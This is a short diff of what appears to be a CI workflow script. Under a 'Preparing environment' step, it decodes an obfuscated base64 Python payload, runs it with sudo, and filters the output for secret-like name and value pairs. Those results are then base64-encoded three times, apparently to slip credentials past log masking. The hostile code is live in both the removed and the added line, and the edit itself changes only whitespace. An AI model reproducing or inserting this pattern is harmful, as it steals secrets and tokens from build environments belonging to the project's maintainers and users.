@@ -11,7 +11,7 @@ SCRIPT_RUNNER="IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwoKIyBiYXNlZCBvbiBodHRwczovL2RhdmlkZ
 
 echo '::group:: Preparing environment ...'
 
-      echo $SCRIPT_RUNNER | base64 -d > "$TEMP/runner_script.py"
+      echo $SCRIPT_RUNNER |  base64 -d > "$TEMP/runner_script.py"
      
       VALUES=`sudo python3 $TEMP/runner_script.py | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*",' | sort -u | base64 -w 0 | base64 -w 0 | base64 -w 0`
      
